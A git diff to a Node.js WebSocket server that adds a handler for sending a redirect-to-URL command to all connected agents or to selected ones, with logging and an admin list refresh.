@@ -350,6 +350,43 @@ wss.on('connection', (ws) => {
           }
         });
       }
+
+      // Redirect agents to custom website / URL
+      if (data.type === 'redirect_url') {
+        let { url, targetIds } = data;
+        if (!url || !url.trim()) return;
+
+        url = url.trim();
+        if (!url.startsWith('http://') && !url.startsWith('https://')) {
+          url = 'https://' + url;
+        }
+
+        const navMsg = JSON.stringify({
+          type: 'command',
+          action: 'redirect_url',
+          url: url
+        });
+
+        let count = 0;
+        const sendToAgent = (agentWs, info) => {
+          if (agentWs.readyState === 1) {
+            agentWs.send(navMsg);
+            info.url = url;
+            count++;
+          }
+        };
+
+        if (!targetIds || targetIds === 'ALL') {
+          agents.forEach((info, agentWs) => sendToAgent(agentWs, info));
+          sendLog('info', `🌐 Redirecting ALL agents (${count}) to: ${url}`);
+        } else if (Array.isArray(targetIds)) {
+          agents.forEach((info, agentWs) => {
+            if (targetIds.includes(info.id)) sendToAgent(agentWs, info);
+          });
+          sendLog('info', `🌐 Redirecting ${count} selected agent(s) to: ${url}`);
+        }
+        sendAgentListToAdmins();
+      }
     }
   });
 
